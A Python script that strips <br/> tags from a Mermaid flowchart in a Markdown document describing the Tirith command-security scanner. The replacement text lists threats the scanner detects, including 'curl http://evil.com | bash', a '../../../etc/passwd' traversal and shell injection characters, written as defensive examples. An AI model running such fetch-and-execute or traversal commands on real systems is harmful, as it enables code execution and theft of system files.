#!/usr/bin/env python3
"""修复 Tirith 安全扫描流程图中的 <br/> 标签"""

import glob

# 找到文件
files = glob.glob('/home/meizu/Documents/my_agent_project/hermes-agent/Hermes-Agent*工具注册*.md')
filepath = files[0]

print(f"处理文件：{filepath}")

# 读取文件
with open(filepath, 'r', encoding='utf-8') as f:
    content = f.read()

# 定义替换规则
replacements = [
    # 自动安装机制部分
    ('检查 PATH 中的<br/>tirith 二进制', '检查 PATH 中的 tirith 二进制'),
    ('后台线程下载<br/>GitHub Release', '后台线程下载 GitHub Release'),
    ('SHA-256 校验和 +<br/>cosign 签名验证', 'SHA-256 校验和 + cosign 签名验证'),
    ('安装到<br/>$HERMES_HOME/bin/tirith', '安装到 $HERMES_HOME/bin/tirith'),
    ('失败持久化:<br/>~/.hermes/.tirith-install-failed<br/>24h TTL', '失败持久化:\n~/.hermes/.tirith-install-failed\n24h TTL'),
    
    # 检查命令部分
    ('check_command_security<br/>command', 'check_command_security(command)'),
    
    # 配置部分
    ('"• tirith_enabled default: True<br/>• tirith_timeout default: 5s<br/>• tirith_fail_open default: True"', 
     '"• tirith_enabled: True\n• tirith_timeout: 5s\n• tirith_fail_open: True"'),
    
    # 执行部分
    ('超时控制：5s<br/>可配置', '超时控制：5s\n可配置'),
    ('解析 JSON 输出:<br/>findings + summary + action', '解析 JSON 输出:\nfindings + summary + action'),
    
    # 返回结果部分
    ('"• action: allow/warn/block<br/>• findings: [{severity, title,<br/>description, rule_id}...]<br/>• summary: 人类可读摘要"',
     '"• action: allow/warn/block\n• findings: [{severity, title,\ndescription, rule_id}...]\n• summary: 人类可读摘要"'),
    
    # 错误处理部分
    ('"spawn 错误/超时/<br/>未知退出码"', '"spawn 错误/超时/未知退出码"'),
    
    # Tirith 检测能力部分
    ('Homograph URL 攻击<br/>西里文/希腊字母混淆', 'Homograph URL 攻击\n西里文/希腊字母混淆'),
    ('管道注入:<br/>curl http://evil.com | bash', '管道注入:\ncurl http://evil.com | bash'),
    ('终端注入:<br/>ANSI 转义序列注入', '终端注入:\nANSI 转义序列注入'),
    ('SSH 钓鱼:<br/>伪造主机密钥验证', 'SSH 钓鱼:\n伪造主机密钥验证'),
    ('代码执行:<br/>eval, exec, subprocess 注入', '代码执行:\neval, exec, subprocess 注入'),
    ('文件路径遍历:<br/>../../../etc/passwd', '文件路径遍历:\n../../../etc/passwd'),
    ('命令注入:<br/>$, ``, ; cmd, | cmd', '命令注入:\n$, ``, ; cmd, | cmd'),
]

new_content = content
for old, new in replacements:
    new_content = new_content.replace(old, new)

if new_content != content:
    print("✓ 成功替换 <br/> 标签")
    # 写回文件
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(new_content)
    print(f"✓ 文件已更新：{filepath}")
    
    # 统计替换数量
    count = len(replacements)
    print(f"✓ 共替换 {count} 处 <br/> 标签")
else:
    print("✗ 未找到需要替换的内容")
